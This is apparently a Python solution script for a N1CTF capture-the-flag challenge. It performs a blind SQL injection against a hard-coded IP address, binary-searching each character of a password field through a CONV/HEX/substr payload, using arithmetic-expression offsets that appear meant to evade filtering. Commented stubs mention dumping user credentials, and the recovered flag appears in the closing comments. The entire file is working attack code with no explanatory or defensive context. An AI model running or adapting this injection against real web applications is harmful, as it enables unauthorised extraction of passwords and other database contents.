import requests, urllib, re, sys, base64
from time import sleep
import math

url_base = "http://47.52.137.90:20000/"

sessid = requests.Session()

dictio = {
	'0': '0',
	'1': '1',
	'2': '1 + 1',
	'3': '10 - 7',
	'4': '10 - 6',
	'5': '6 - 1',
	'6': '6',
	'7': '7',
	'8': '8',
	'9': '8 + 1',
	'10': '10',
	'11': '11',
	'12': '6 + 6',
	'13': '7 + 6',
	'14': '8 + 6',
	'15': '8 + 7',
	'16': '16',
	'17': '17',
	'18': '18',
	'19': '11 + 8',
	'20': '10 + 10',
	'21': '10 + 11',
	'22': '16 + 6',
	'23': '16 + 7'
}


init_array = []
debug_mode = True
fancy_console = False

ASCIIAlphabet = "\001 !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~\127"
simpleAlphabet = "\001abcdefghijklmnopqrstuvwxyz"
HEXAlphabet = "\0010123456789abcdef"
advancedAlphabet= "\0010123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz\128"

pw_payload = " > CONV(HEX( substr( pw , @@offset@@ , 1 ) ), 16, 10)"

def printInPlace(alert):
	if fancy_console:
		sys.stdout.write("{}{}".format(alert, "\b"*len(alert)))
		sys.stdout.flush();
	return fancy_console

def createPayload( query, offset ):
	return {"flag": offset, "hi": query }

def __debug(string):
	if debug_mode == True: print ("exec: {}".format(string))
	return debug_mode
	
def sendPayload ( query, offset ):
	__debug("exec: {} {}".format(offset, query))
	payload = createPayload(query, offset)
	delete = sessid.post(url_base, payload)
	return resultCompare(delete.text)

def logIn():
	print ("loggin in: ")
	sessid.get(url_base, allow_redirects=True)
	return

def resultCompare(text):
	regex = re.compile(r"My Points</grey> \| 1")
	matches = regex.findall(text)
	return matches

def tryPayload(str, offset):
	global init_array
	init_array = sendPayload(str, offset)
	return 1 == len(init_array)

#bin-search ASCII inside [alphabet]
def findName(payload, alphabet):
	a = 0
	b = len(alphabet)-1
	while (a < b):
		mid = (a+b+1)//2;
		c = alphabet[mid]
		printInPlace(c)
		if tryPayload(payload, ord(c)):
			b = mid - 1
		else:
			a = mid
	return alphabet[a]


def findNames(payload, alphabet):
	global dictio
	result = "";
	for word_offset in range(1, 24):
		pl = payload.replace("@@offset@@", dictio[str(word_offset)])
		c = findName(pl, alphabet)
		if c == alphabet[len(alphabet) - 1]: break
		sys.stdout.write(c)
		sys.stdout.flush
		result+=c
	print(" " + result)
	return


def findPw():
	print ("..:: Searching for pw ::..")
	findNames(pw_payload, ASCIIAlphabet)



fancy_console = True # Turn on fancy terminal output
debug_mode = False # Turn off debugging mode
logIn();


# init_array = sendPayload(" AND 1#");
# print (init_array); 


findPw();
# findUsersColumns();
# findSpiesColumns();
# findUsersCreds();


# hahah777b7ah~77777aaaa|

#hahah777b7ah~77777aaaa~
#hahah777a7ahz77777aaaaz

#hahah777a7ah~77776aaaa~

#hahah777a7ah~77777aaaa~

# N1CTF{hahah777a7aha77777aaaa}